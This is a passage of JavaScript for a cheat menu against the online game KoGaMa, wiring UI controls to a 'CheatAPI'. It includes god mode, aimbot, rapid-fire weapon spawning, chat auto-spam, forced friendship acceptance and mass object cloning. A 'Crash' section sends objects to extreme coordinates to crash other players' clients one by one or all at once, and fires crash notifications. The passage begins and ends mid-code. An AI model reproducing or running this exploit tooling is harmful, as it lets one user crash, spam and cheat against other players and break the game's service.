        let woid = CheatAPI.PLAYER.WOID
        CheatAPI.CHEATS.SET_HEALTH(woid, 99999999)
        CheatAPI.CHEATS.SET_MAX_HEALTH(woid, 99999999)
        CheatAPI.SERVER_BLOCKS.push(32)
    } else {
        let woid = CheatAPI.PLAYER.WOID
        CheatAPI.CHEATS.SET_HEALTH(woid, 100)
        CheatAPI.CHEATS.SET_MAX_HEALTH(woid, 100)
        let index = CheatAPI.SERVER_BLOCKS.indexOf(32)
        CheatAPI.SERVER_BLOCKS.splice(index, index - 1)
    }
}

interface.addLine(true, 30, "Player")
interface.addSelect("Change Team", Object.keys(CheatAPI.TEAM_IDS), "Player", function(){
    CheatAPI.CHEATS.CHANGE_TEAM(CheatAPI.TEAM_IDS[window["Change Team"].options[window["Change Team"].selectedIndex].textContent])
})
interface.addLine(true, 30, "Player")

interface.addSelect("Better Than Effects", Object.keys(CheatAPI.NO_IDS), "Player", function(){
    CheatAPI.CHEATS.EF(CheatAPI.NO_IDS[window["Better Than Effects"].options[window["Better Than Effects"].selectedIndex].textContent])
})
interface.addLine(true, 30, "Player")




interface.addRange("Fly(0)", "Player")
window["Fly(0)"].input.min = 0
window["Fly(0)"].input.max = 10
window["Fly(0)"].input.value = 0
window["Fly(0)"].input.onchange = function(e) {
    window["Fly(0)"].label.textContent = `Fly(${window["Fly(0)"].input.value})`
    window.fly = parseInt(window["Fly(0)"].input.value)
}




interface.addTextField("Self size", "Player")
window["Self size"].onkeydown = function(e){
    if(e.key == "Enter"){
        CheatAPI.CHEATS.RUN_TIME(CheatAPI.PLAYER.WOID,this.value,"BOTH")
    }
}

interface.addRange("Other Players Size(1)", "Player")
window["Other Players Size(1)"].input.min = 1
window["Other Players Size(1)"].input.max = 20
window["Other Players Size(1)"].input.value = 1
window["Other Players Size(1)"].input.onchange = function(){
    window["Other Players Size(1)"].label.textContent = `Other Players Size(${window["Other Players Size(1)"].input.value})`
    CheatAPI.PLAYERS.forEach((player)=>{ if(player.WOID != CheatAPI.PLAYER.WOID)
                CheatAPI.CHEATS.SET_SIZE(player.WOID, parseInt(window["Other Players Size(1)"].input.value), "SERVER")
                                       })}
/* if(e.key == "3" && window.aimhelperkey) {
        CheatAPI.PLAYERS.forEach((player)=>{
            if(player.WOID != CheatAPI.PLAYER.WOID)
                CheatAPI.CHEATS.SET_SIZE(player.WOID, 5, "SERVER")
        })*/
interface.addRange("Player Level(1)", "Player")
window["Player Level(1)"].input.min = 1
window["Player Level(1)"].input.max = 45
window["Player Level(1)"].input.value = 1
window["Player Level(1)"].input.onchange = function(){
    window["Player Level(1)"].label.textContent = `Player Level(${window["Player Level(1)"].input.value})`
    CheatAPI.CHEATS.SET_LEVEL(parseInt(window["Player Level(1)"].input.value))
}
interface.addRange("Player Tier(1)", "Player")
window["Player Tier(1)"].input.min =48
window["Player Tier(1)"].input.max =51
window["Player Tier(1)"].input.value =48
window["Player Tier(1)"].input.onchange = function(){
    window["Player Tier(1)"].label.textContent = `Player Tier(${window["Player Tier(1)"].input.value})`
    CheatAPI.CHEATS.UNLOCK_TIER(parseInt(window["Player Tier(1)"].input.value))
}
interface.addRange("Player Heal(1)", "Player")
window["Player Heal(1)"].input.min = 1
window["Player Heal(1)"].input.max = 9999
window["Player Heal(1)"].input.value = 1
window["Player Heal(1)"].input.onchange = function(){
    window["Player Heal(1)"].label.textContent = `Player Heal(${window["Player Heal(1)"].input.value})`
    CheatAPI.CHEATS.HEALVALUE(parseInt(window["Player Heal(1)"].input.value))
}


interface.addLine(true, 30, "Player")
interface.addCheckBox("Swim", "Player")
window["Swim"].onchange = function() {
  if(this.checked){
        window.spam4 = setInterval(()=>{
        CheatAPI.CHEATS.A1()
        }, 100)
    }else{
        clearInterval(window.spam4)

    }
}

interface.addCheckBox("Walk", "Player")
window["Walk"].onchange = function() {
  if(this.checked){
        window.spam7 = setInterval(()=>{
        CheatAPI.CHEATS.A2()
        }, 100)
    }else{
        clearInterval(window.spam7)

    }
}
interface.addCheckBox("Freeze", "Player")
window["Freeze"].onchange = function() {
  if(this.checked){
        window.spamo = setInterval(()=>{
        CheatAPI.CHEATS.A3()
        }, 100)
    }else{
        clearInterval(window.spamo)

    }
}
interface.addCheckBox("Jump", "Player")
window["Jump"].onchange = function() {
  if(this.checked){
        window.spam39 = setInterval(()=>{
        CheatAPI.CHEATS.A4()
        }, 100)
    }else{
        clearInterval(window.spam39)

    }
}

interface.addCheckBox("Tpose", "Player")
window["Tpose"].onchange = function() {
  if(this.checked){
        window.spam3 = setInterval(()=>{
        CheatAPI.CHEATS.A5()
        }, 100)
    }else{
        clearInterval(window.spam3)

    }
}

interface.addCheckBox("Death", "Player")
window["Death"].onchange = function() {
  if(this.checked){
        window.spam3s = setInterval(()=>{
        CheatAPI.CHEATS.A6()
        }, 100)
    }else{
        clearInterval(window.spam3s)

    }
}


interface.addButton("AimBot (3)", "Weapon")
window["AimBot (3)"].onclick = function(){
      if (aimBot == true){

                   aimBot = false; }
 else{
aimBot = true;
 }

}
interface.addButton("ESP + NoClip (experimental)", "Weapon")
window["ESP + NoClip (experimental)"].onclick = function(){
  //  CheatAPI.CHEATS.CLONE_OBJECTTEST1(75579,"SERVER")
   CheatAPI.CHEATS.RESET_TERRAIN()
   CheatAPI.SEND_SOCKET(243,3,1,0,0,42,0,1,22,105,...CheatAPI.FUNCTIONS.TO_BYTE_32(75579))
    //
}


interface.addCheckBox("Rapid Bazooka (for aimbot)", "Weapon")
window["Rapid Bazooka (for aimbot)"].onchange = function() {
    if (this.checked) {
        window.autofire2d = setInterval(() => {for(var lag = 0; lag < 1; lag++){
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(4)
        }}, 0)
    } else {
        clearInterval(window.autofire2d)
        window.rapidfire2d = null
    }
}

interface.addCheckBox("Sniper Bot", "Weapon")
window["Sniper Bot"].onchange = function() {
    if (this.checked) {
        window.autofqire = setInterval(() => {
         CheatAPI.CHEATS.IS_FIRING(1)
         CheatAPI.CHEATS.IS_FIRING(0)
         CheatAPI.CHEATS.IS_FIRING(1)
            CheatAPI.CHEATS.SPAWN_ITEM2(6)
        }, 6000)
    } else {
        clearInterval(window.autofqire)
        window.rapidfires = null
    }
}
interface.addCheckBox("Impulse Bot", "Weapon")
window["Impulse Bot"].onchange = function() {
    if (this.checked) {
        window.autofqire = setInterval(() => {
         CheatAPI.CHEATS.IS_FIRING(1)
         CheatAPI.CHEATS.IS_FIRING(0)
         CheatAPI.CHEATS.IS_FIRING(1)
            CheatAPI.CHEATS.SPAWN_ITEM2(2)
        }, 6000)
    } else {
        clearInterval(window.autofqire)
        window.rapidfires = null
    }
}
interface.addLine(true, 30, "Weapon")
interface.addCheckBox("Auto Fire", "Weapon")
window["Auto Fire"].onchange = function() {
    if (this.checked) {
        window.autofire = setInterval(() => {
            CheatAPI.CHEATS.IS_FIRING(1)
        }, 5)
    } else {
        clearInterval(window.autofire)
        window.rapidfire = null
    }
}
interface.addCheckBox("Hold Fire", "Weapon")
window["Hold Fire"].onchange = function() {
    if (this.checked) {
        window.autofired = setInterval(() => {
            CheatAPI.CHEATS.IS_FIRING(0)
        }, 5)
    } else {
        clearInterval(window.autofired)
        window.rapidfired = null
    }
}
interface.addLine(true, 30, "Weapon")

interface.addSelect("Weapon", Object.keys(CheatAPI.ITEM_IDS), "Weapon", function(){
    CheatAPI.CHEATS.SPAWN_ITEM(CheatAPI.ITEM_IDS[window["Weapon"].options[window["Weapon"].selectedIndex].textContent])
})
interface.addSelect("Weapon 2", Object.keys(CheatAPI.ITEM_IDS), "Weapon", function(){
    CheatAPI.CHEATS.SPAWN_ITEM2(CheatAPI.ITEM_IDS[window["Weapon 2"].options[window["Weapon 2"].selectedIndex].textContent])
})
interface.addSelect("CubeGun", Object.keys(CheatAPI.MATERIAL_IDS), "Weapon", function(){
    CheatAPI.CHEATS.CUBEGUN(CheatAPI.MATERIAL_IDS[window["CubeGun"].options[window["CubeGun"].selectedIndex].textContent])
})
interface.addLine(true, 30, "Weapon")
interface.addCheckBox("Rapid Bazooka", "Weapon")
window["Rapid Bazooka"].onchange = function() {
    if (this.checked) {
        window.autofire2 = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(4)
        }, 100)
    } else {
        clearInterval(window.autofire2)
        window.rapidfire2 = null
    }
}
interface.addCheckBox("Rapid Sword", "Weapon")
window["Rapid Sword"].onchange = function() {
    if (this.checked) {
        window.autofire27 = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(8)
        }, 100)
    } else {
        clearInterval(window.autofire27)
        window.rapidfire27 = null
    }
}
interface.addCheckBox("Rapid ShotGun", "Weapon")
window["Rapid ShotGun"].onchange = function() {
    if (this.checked) {
        window.autofire277 = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(9)
        }, 100)
    } else {
        clearInterval(window.autofire277)
        window.rapidfire277 = null
    }
}
interface.addCheckBox("Rapid GrowthGun", "Weapon")
window["Rapid GrowthGun"].onchange = function() {
    if (this.checked) {
        window.autofire27s = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(62)
        }, 100)
    } else {
        clearInterval(window.autofire27s)
        window.rapidfire27s = null
    }
}
interface.addCheckBox("Rapid MouseGun", "Weapon")
window["Rapid MouseGun"].onchange = function() {
    if (this.checked) {
        window.autofire271 = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(60)
        }, 100)
    } else {
        clearInterval(window.autofire271)
        window.rapidfire271 = null
    }
}
interface.addCheckBox("Rapid Shuriken", "Weapon")
window["Rapid Shuriken"].onchange = function() {
    if (this.checked) {
        window.autofire2714 = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(45)
        }, 100)
    } else {
        clearInterval(window.autofire2714)
        window.rapidfire2714 = null
    }
}
interface.addCheckBox("Rapid Multiple-Shurikens", "Weapon")
window["Rapid Multiple-Shurikens"].onchange = function() {
    if (this.checked) {
        window.autofire271h = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(46)
        }, 100)
    } else {
        clearInterval(window.autofire271h)
        window.rapidfire271h = null
    }
}
interface.addCheckBox("Rapid Revolver", "Weapon")
window["Rapid Revolver"].onchange = function() {
    if (this.checked) {
        window.autofire271d = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(12)
        }, 100)
    } else {
        clearInterval(window.autofire271d)
        window.rapidfire271d = null
    }
}
interface.addCheckBox("Rapid CenterGun", "Weapon")
window["Rapid CenterGun"].onchange = function() {
    if (this.checked) {
        window.autofire24 = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(1)
        }, 100)
    } else {
        clearInterval(window.autofire24)
        window.rapidfire24 = null
    }
}
interface.addCheckBox("Rapid DoubleRevolvers", "Weapon")
window["Rapid DoubleRevolvers"].onchange = function() {
    if (this.checked) {
        window.autofire24f = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(13)
        }, 100)
    } else {
        clearInterval(window.autofire24f)
        window.rapidfire24f = null
    }
}
interface.addCheckBox("Rapid SlapGun", "Weapon")
window["Rapid SlapGun"].onchange = function() {
    if (this.checked) {
        window.autofire2d4f = setInterval(() => {
            CheatAPI.CHEATS.SPAWN_ITEM(5)
            CheatAPI.CHEATS.SPAWN_ITEM(65)
        }, 100)
    } else {
        clearInterval(window.autofire2d4f)
        window.rapidfire2d4f = null
    }
}




interface.addSelect("Message Type", Object.keys(CheatAPI.MESSAGE_TYPE), "Chat", function(){
    window["Enter Message"].disabled = false
})
interface.addTextField("Enter Message", "Chat")
window["Enter Message"].disabled = true
window["Enter Message"].maxLength = 254
window["Enter Message"].addEventListener("keydown", function(e){
    window["Auto Spam"].disabled = false
    if(e.key == "Enter"){
        CheatAPI.CHEATS.SEND_CHAT_MESSAGE(CheatAPI.MESSAGE_TYPE[window["Message Type"].options[window["Message Type"].selectedIndex].textContent], CheatAPI.PLAYER.ACTORNR, window["Enter Message"].value)
        window["Enter Message"].value = ""
    }
})
interface.addCheckBox("Auto Spam", "Chat")
window["Auto Spam"].disabled = true
window["Auto Spam"].onchange = function(){
    if(this.checked){
        window.spam = setInterval(()=>{
        CheatAPI.CHEATS.SEND_CHAT_MESSAGE(CheatAPI.MESSAGE_TYPE[window["Message Type"].options[window["Message Type"].selectedIndex].value], CheatAPI.PLAYER.ACTORNR, window["Enter Message"].value)
        }, 100)
    }else{
        clearInterval(window.spam)
    }
}
interface.addButton("You", "Objects")
window["You"].onclick = function(){window.open("https://www.kogama.com/profile/me/")}


interface.addTextField("Enter Your ID", "Objects")
window["Enter Your ID"].addEventListener("keydown", function(e){
    window["Auto Clone self"].disabled = false
    if(e.key == "Enter"){
        CheatAPI.CHEATS.CLONE_OBJECT(window["Enter Your ID"].value)
    }
})
interface.addCheckBox("Auto Clone self", "Objects")
window["Auto Clone self"].disabled = true
window["Auto Clone self"].onchange = function(){
    if(this.checked){
        window.spamq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(window["Enter Your ID"].value,CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamq)
    }
}
interface.addLine(true, 30, "Objects")
interface.addButton("Build Avatar", "Objects")
window["Build Avatar"].onclick = function(){window.open("https://www.kogama.com/games/play/2593313/")}

interface.addSelect("Clone Object_", Object.keys(CheatAPI.Objects_AVATAR), "Objects", function(){
    window["Auto Object_"].disabled = false
})
interface.addCheckBox("Auto Object_", "Objects")
window["Auto Object_"].disabled = true
window["Auto Object_"].onchange = function(){
    if(this.checked){
        window.spsamf = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects_AVATAR[window["Clone Object_"].options[window["Clone Object_"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spsamf)
    }
}
interface.addLine(true, 30, "Objects")
interface.addButton("War 4", "Objects")
window["War 4"].onclick = function(){window.open("https://www.kogama.com/games/play/2593313/")}

interface.addSelect("Clone Object1", Object.keys(CheatAPI.Objects), "Objects", function(){
    window["Auto Clone"].disabled = false
})
interface.addCheckBox("Auto Clone", "Objects")
window["Auto Clone"].disabled = true
window["Auto Clone"].onchange = function(){
    if(this.checked){
        window.spamf = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects[window["Clone Object1"].options[window["Clone Object1"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamf)
    }
}

interface.addRange("Generate Random Weapons World(1)", "Objects")
window["Generate Random Weapons World(1)"].input.min = 1
window["Generate Random Weapons World(1)"].input.max = 10
window["Generate Random Weapons World(1)"].input.value = 1
window["Generate Random Weapons World(1)"].input.onchange = function(){
    window["Generate Random Weapons World(1)"].label.textContent = `Generate Random Weapons World(${window["Generate Random Weapons World(1)"].input.value})`
    CheatAPI.TESTE3(parseInt(window["Generate Random Weapons World(1)"].input.value))
}
interface.addButton("Water_red", "Objects")
window["Water_red"].onclick = function(){
    CheatAPI.CHEATS.WATER_SETTINGS(258715,"SERVER")
}

interface.addLine(true, 30, "Objects")
interface.addButton("Super War", "Objects")
window["Super War"].onclick = function(){window.open("https://www.kogama.com/games/play/10054560/")}


interface.addSelect("Clone Object2", Object.keys(CheatAPI.Objects2), "Objects", function(){
    window["Auto Clone2"].disabled = false
})
interface.addCheckBox("Auto Clone2", "Objects")
window["Auto Clone2"].disabled = true
window["Auto Clone2"].onchange = function(){
    if(this.checked){
        window.spamfs = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects2[window["Clone Object2"].options[window["Clone Object2"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamfs)
    }
}

interface.addLine(true, 30, "Objects")
interface.addButton("cube gun 1011", "Objects")
window["cube gun 1011"].onclick = function(){window.open("https://www.kogama.com/games/play/2263148/")}


interface.addSelect("Clone Object3", Object.keys(CheatAPI.Objects3), "Objects", function(){
    window["Auto Object3"].disabled = false
})
interface.addCheckBox("Auto Object3", "Objects")
window["Auto Object3"].disabled = true
window["Auto Object3"].onchange = function(){
    if(this.checked){
        window.spamfst = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects3[window["Clone Object3"].options[window["Clone Object3"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamfst)
    }
}

interface.addLine(true, 30, "Objects")
interface.addButton("?LoL CuBe GuN 12 ?", "Objects")
window["?LoL CuBe GuN 12 ?"].onclick = function(){window.open("https://www.kogama.com/games/play/8665705/")}

interface.addSelect("Clone Object4", Object.keys(CheatAPI.Objects4), "Objects", function(){
    window["Auto Object4"].disabled = false
})
interface.addCheckBox("Auto Object4", "Objects")
window["Auto Object4"].disabled = true
window["Auto Object4"].onchange = function(){
    if(this.checked){
        window.spamfstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects4[window["Clone Object4"].options[window["Clone Object4"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamfstq)
    }
}

interface.addLine(true, 30, "Objects")
interface.addButton("cube gun :D :D3", "Objects")
window["cube gun :D :D3"].onclick = function(){window.open("https://www.kogama.com/games/play/879737/")}

interface.addSelect("Clone Object5", Object.keys(CheatAPI.Objects5), "Objects", function(){
    window["Auto Object5"].disabled = false
})
interface.addCheckBox("Auto Object5", "Objects")
window["Auto Object5"].disabled = true
window["Auto Object5"].onchange = function(){
    if(this.checked){
        window.spamfdstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects5[window["Clone Object5"].options[window["Clone Object5"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamfdstq)
    }
}
interface.addLine(true, 30, "Objects")
interface.addButton("- Love Land 43 -", "Objects")
window["- Love Land 43 -"].onclick = function(){window.open("https://www.kogama.com/games/play/5165832/")}

interface.addSelect("Clone Object6", Object.keys(CheatAPI.Objects6), "Objects", function(){
    window["Auto Object6"].disabled = false
})
interface.addCheckBox("Auto Object6", "Objects")
window["Auto Object6"].disabled = true
window["Auto Object6"].onchange = function(){
    if(this.checked){
        window.spamfdstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects6[window["Clone Object6"].options[window["Clone Object6"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spamfdstq)
    }
}

interface.addLine(true, 30, "Objects")
interface.addButton("?| KoWaRa | PvP + Oculus |?", "Objects")
window["?| KoWaRa | PvP + Oculus |?"].onclick = function(){window.open("https://www.kogama.com/games/play/5471500/")}

interface.addSelect("Clone Object7", Object.keys(CheatAPI.Objects7), "Objects", function(){
    window["Auto Object7"].disabled = false
})
interface.addCheckBox("Auto Object7", "Objects")
window["Auto Object7"].disabled = true
window["Auto Object7"].onchange = function(){
    if(this.checked){
        window.spsamfdstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects7[window["Clone Object7"].options[window["Clone Object7"].selectedIndex].value],CheatAPI.PLAYER.POS.X+7, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spsamfdstq)
    }
}


interface.addCheckBox("Kill Oculus", "Objects")
window["Kill Oculus"].onchange = function() {
    if (this.checked) {
        window.sautofire2d4f = setInterval(() => {for(var lag = 0; lag < 2; lag++){
    CheatAPI.CHEATS.Kill_Object(259342,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259267,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259344,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259271,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259346,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259275,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259348,"BOTH")
    CheatAPI.CHEATS.Kill_Object(259279,"BOTH")
        }}, 1000)
    } else {
        clearInterval(window.sautofire2d4f)
        window.srapidfire2d4f = null
    }
}

interface.addLine(true, 30, "Objects")
interface.addButton("Pool Table", "Objects")
window["Pool Table"].onclick = function(){window.open("https://www.kogama.com/games/play/35401/")}

interface.addSelect("Clone Object8", Object.keys(CheatAPI.Objects8), "Objects", function(){
    window["Auto Object8"].disabled = false
})
interface.addCheckBox("Auto Object8", "Objects")
window["Auto Object8"].disabled = true
window["Auto Object8"].onchange = function(){
    if(this.checked){
        window.spsamfddstq = setInterval(()=>{
        CheatAPI.CHEATS.CLONE_OBJECT(CheatAPI.Objects8[window["Clone Object8"].options[window["Clone Object8"].selectedIndex].value],CheatAPI.PLAYER.POS.X+2, CheatAPI.PLAYER.POS.Y, CheatAPI.PLAYER.POS.Z, "BOTH")
        }, 100)
    }else{
        clearInterval(window.spsamfddstq)
    }
}



interface.addSelect("Effect Type", Object.keys(CheatAPI.EFFECT_TYPE), "Other", function(){
    window["Enter ID"].disabled = false
})

interface.addTextField("Enter ID", "Other")
window["Enter ID"].disabled = true
window["Enter ID"].maxLength = 254
window["Enter ID"].addEventListener("keydown", function(e){
    window["Auto use"].disabled = false
    if(e.key == "Enter"){
        CheatAPI.CHEATS.EFFECT_PLAYER(CheatAPI.EFFECT_TYPE[window["Effect Type"].options[window["Effect Type"].selectedIndex].textContent], window["Enter ID"].value)
        window["Enter ID"].value = ""
    }
})
interface.addCheckBox("Auto use", "Other")
window["Auto use"].disabled = true
window["Auto use"].onchange = function(){
    if(this.checked){
        window.spaam = setInterval(()=>{
        CheatAPI.CHEATS.EFFECT_PLAYER(CheatAPI.EFFECT_TYPE[window["Effect Type"].options[window["Effect Type"].selectedIndex].value], window["Enter ID"].value)
        }, 100)
    }else{
        clearInterval(window.spaam)
    }
}
interface.addLine(true, 30, "Other")

interface.addLine(true, 30, "Other")
interface.addCheckBox("Freeze Players(1 | 2)", "Other")
window["Freeze Players(1 | 2)"].onchange = function(){
    window.freezeplayers = this.checked
    window.freezeplayerskey = this.checked
}


interface.addButton("Reset Terrain", "Other")
window["Reset Terrain"].onclick = function(){
    CheatAPI.CHEATS.RESET_TERRAIN()
}

interface.addButton("Capture Flag", "Other")
window["Capture Flag"].onclick = function(){
    CheatAPI.CHEATS.CAPTURE_FLAG()
}

interface.addLine(true, 30, "Other")


interface.addTextField("Profile ID", "Other")
window["Profile ID"].onchange = function(){
    window["Force Friendship"].disabled = false
}
interface.addButton("Force Friendship", "Other")
window["Force Friendship"].disabled = true
window["Force Friendship"].onclick = function(){
    CheatAPI.CHEATS.REQUEST_FRIENDSHIP(parseInt(window["Profile ID"].value))
    setTimeout(()=>{
        let friendship = CheatAPI.FRIENDSHIP_INFOS
        if(friendship){
            CheatAPI.CHEATS.ACCEPT_FRIENDSHIP(friendship.FriendshipID, friendship.ID, friendship.FriendID)
        }
    }, 5000)
}
interface.addSelect("Material", Object.keys(CheatAPI.MATERIAL_IDS), "Cube", function(){
    window.material = CheatAPI.MATERIAL_IDS[window["Material"].options[window["Material"].selectedIndex].textContent]
    window["Surf"].disabled = false
})
interface.addCheckBox("Surf", "Cube")
window["Surf"].disabled = true
window["Surf"].onchange = function(){
    window.surf = this.checked
}
interface.addButton("Delet Cubes (ON/OFF)", "Cube")
window["Delet Cubes (ON/OFF)"].onclick = function(){
      if (surfno == true){

                   surfno = false; }
 else{
surfno = true;
 }

}

interface.addButton("cubeBot (4 | 5)", "Cube")
window["cubeBot (4 | 5)"].onclick = function(){
      if (cubeBot == true){

                   cubeBot = false; }
 else{
cubeBot = true;
 }

}
interface.addButton("cubeBot-V2 (6 | 7)", "Cube")
window["cubeBot-V2 (6 | 7)"].onclick = function(){
      if (cubeBot1 == true){

                   cubeBot1 = false; }
 else{
cubeBot1 = true;
 }

}
/*interface.addLine(true, 30, "Cube")
interface.addCheckBox("Twin Building", "Cube")
window["Twin Building"].onchange = function(){
    window.twinbuildings = this.checked
}*/
interface.addLine(true, 30, "Cube")
interface.addTextField("Text to Cubes", "Cube")
window["Text to Cubes"].onkeydown = function(e){
    if(e.key == "Enter"){
        CheatAPI.CHEATS.TEXT_TO_CUBES(this.value, "25px sans-serif")
    }
}


interface.addRange("Generate Random Normal World(1)", "Cube")
window["Generate Random Normal World(1)"].input.min = 1
window["Generate Random Normal World(1)"].input.max = 10
window["Generate Random Normal World(1)"].input.value = 1
window["Generate Random Normal World(1)"].input.onchange = function(){
    window["Generate Random Normal World(1)"].label.textContent = `Generate Random Normal World(${window["Generate Random Normal World(1)"].input.value})`
    CheatAPI.TESTE(parseInt(window["Generate Random Normal World(1)"].input.value))
}
interface.addRange("Generate Random Slide World(1)", "Cube")
window["Generate Random Slide World(1)"].input.min = 1
window["Generate Random Slide World(1)"].input.max = 10
window["Generate Random Slide World(1)"].input.value = 1
window["Generate Random Slide World(1)"].input.onchange = function(){
    window["Generate Random Slide World(1)"].label.textContent = `Generate Random Slide World(${window["Generate Random Slide World(1)"].input.value})`
    CheatAPI.TESTE1(parseInt(window["Generate Random Slide World(1)"].input.value))
}

interface.addRange("Generate Random Damage World(1)", "Cube")
window["Generate Random Damage World(1)"].input.min = 1
window["Generate Random Damage World(1)"].input.max = 10
window["Generate Random Damage World(1)"].input.value = 1
window["Generate Random Damage World(1)"].input.onchange = function(){
    window["Generate Random Damage World(1)"].label.textContent = `Generate Random Damage World(${window["Generate Random Damage World(1)"].input.value})`
    CheatAPI.TESTE2(parseInt(window["Generate Random Damage World(1)"].input.value))
}
interface.addRange("Map Generate(1)", "Cube")
window["Map Generate(1)"].input.min = 1
window["Map Generate(1)"].input.max = 10
window["Map Generate(1)"].input.value = 1
window["Map Generate(1)"].input.onchange = function(){
    window["Map Generate(1)"].label.textContent = `Map Generate(${window["Map Generate(1)"].input.value})`
    CheatAPI.MAP_GENERATE(parseInt(window["Map Generate(1)"].input.value))
}
interface.addLine(true, 30, "Cube")

interface.addFileInput("Image to Cubes", "Cube")
window["Image to Cubes"].onchange = function(){
    CheatAPI.CHEATS.IMAGE_TO_CUBES(URL.createObjectURL(this.files[0]))
}
interface.addSelect("Crash Player", [], "Crash", function(){
    let WoIds = []
    CheatAPI.PLAYERS.forEach((player)=>{
        WoIds.push(player.WOID)
    })
    CheatAPI.CHEATS.CLONE_OBJECT(WoIds[window["Crash Player"].selectedIndex - 1]+2, -3.402823466E+38, -3.402823466E+38, -3.402823466E+38, "CLIENT")
})
interface.addButton("Crash All", "Crash")
window["Crash All"].onclick = function(){
    CheatAPI.PLAYERS.forEach((player)=>{
        CheatAPI.CHEATS.CLONE_OBJECT(player.WOID+2, -3.402823466E+38, -3.402823466E+38, -3.402823466E+38, "CLIENT")
    })
}
interface.addButton("Instant WebGL Crash", "Crash")
window["Instant WebGL Crash"].onclick = function(){
    CheatAPI.CHEATS.SET_SIZE(CheatAPI.PLAYER.WOID, 9999999999999999999999999999999999, "CLIENT")
    setTimeout(()=>{
        CheatAPI.CHEATS.SET_SIZE(CheatAPI.PLAYER.WOID, 1, "CLIENT")
    }, 5000)
}

interface.addButton("Black Map Crash", "Crash")
window["Black Map Crash"].onclick = function(){
CheatAPI.CHEATS.CLONE_OBJECTTEST(75579,"BOTH")
}

interface.addSelect("Notification", Object.keys(CheatAPI.NOTI_IDS), "Notif", function(){
    CheatAPI.CHEATS.CRASH_NOTI(CheatAPI.NOTI_IDS[window["Notification"].options[window["Notification"].selectedIndex].textContent])
})

interface.addSelect("Crash Notification", Object.keys(CheatAPI.NOTI_IDS), "Notif", function(){
    CheatAPI.CHEATS.CRASH_NOTI2(CheatAPI.NOTI_IDS[window["Crash Notification"].options[window["Crash Notification"].selectedIndex].textContent])
})
interface.addLine(true, 30, "Notif")
interface.addSelect("LEVEL Notification", Object.keys(CheatAPI.LEVEL_IDS), "Notif", function(){
    CheatAPI.CHEATS.LEVEL_NOTI(CheatAPI.LEVEL_IDS[window["LEVEL Notification"].options[window["LEVEL Notification"].selectedIndex].textContent])
})

interface.addSelect("LEVEL Notification Crash", Object.keys(CheatAPI.LEVEL_IDS), "Notif", function(){
    CheatAPI.CHEATS.LEVEL_NOTI2(CheatAPI.LEVEL_IDS[window["LEVEL Notification Crash"].options[window["LEVEL Notification Crash"].selectedIndex].textContent])
})
interface.addSelect("Kill Notification", Object.keys(CheatAPI.KILLED_BY), "Notif", function(){
